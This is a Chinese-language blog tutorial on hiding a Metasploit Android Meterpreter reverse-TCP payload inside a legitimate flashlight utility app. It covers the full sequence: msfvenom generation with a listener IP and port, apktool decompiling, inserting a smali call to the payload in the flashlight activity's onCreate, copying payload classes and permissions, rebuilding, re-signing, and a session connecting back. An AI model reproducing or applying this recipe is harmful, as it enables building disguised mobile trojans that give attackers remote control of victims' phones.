---
title: 简单的一次手机APK注入
published: 2023-08-23 17:33
tags: [Android, MSF, SQL注入]
category: 工具
draft: false
---

# 一、MSF

```
msfvenom -p android/meterpreter_reverse_tcp LHOST=10.1.239.156 LPORT=5555 > exp.apk

msfconsole
```

![](/images/posts/android-apk-injection/1.jpg)

# 二、注入木马

## 1、安装超级瑞士刀

```
https://www.wandoujia.com/apps/107907
```

## 2、反编译

```
apktool d cjrsd.apk
```

![](/images/posts/android-apk-injection/2.jpg)

## 3、找到配置文件

```
AndroidManifest.xml
```

![](/images/posts/android-apk-injection/3.jpg)

## 4、找到主文件

```
这里其实是手电筒功能的启动程序

android:launchMode="singleTask" android:name="com.utooo.ssknife.torch.TorchActivity"
找到TorchActivity.smali文件
```

![](/images/posts/android-apk-injection/4.jpg)

## 5、找到onCreate函数

```
.method protected onCreate(Landroid/os/Bundle;)V
```

![](/images/posts/android-apk-injection/5.jpg)

## 6、找到启动接口invoke-super

```
invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
```

![](/images/posts/android-apk-injection/6.jpg)

木马的接口可以任意选择，这里选择的是在onStartCommand中，这里是手电筒的启动程序

```
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

![](/images/posts/android-apk-injection/7.jpg)

## 7、将木马的接口写入下一行，格式化写入

![](/images/posts/android-apk-injection/8.jpg)

## 8、将木马apk的metasploit文件夹复制到正常apk的com目录下

![](/images/posts/android-apk-injection/9.jpg)

## 9、更改权限

```
将AndroidManifest.xml中的permssion配置项替换为木马apk的权限配置项
```

![10](/images/posts/android-apk-injection/10.jpg)

## 10、重新编译即可

```
apktool b cjrsd.apk
```

![11](/images/posts/android-apk-injection/11.jpg)

## 11、签名

```
此时还不能安装，用MT文件管理器添加签名即可使用，打开手电筒功能上线，不过使用的不是原有签名，就像很多盗版软件安装时会出现签名不一致无法覆盖安装
```

<img src="/images/posts/android-apk-injection/12.jpg" alt="12" style="zoom: 67%;" />

## 12、上线

```
由于功能是手电筒的启动程序，打开手电筒成功上线。
```

![13](/images/posts/android-apk-injection/13.jpg)

![14](/images/posts/android-apk-injection/14.jpg)

```
接下来就应该熟悉了 :）
```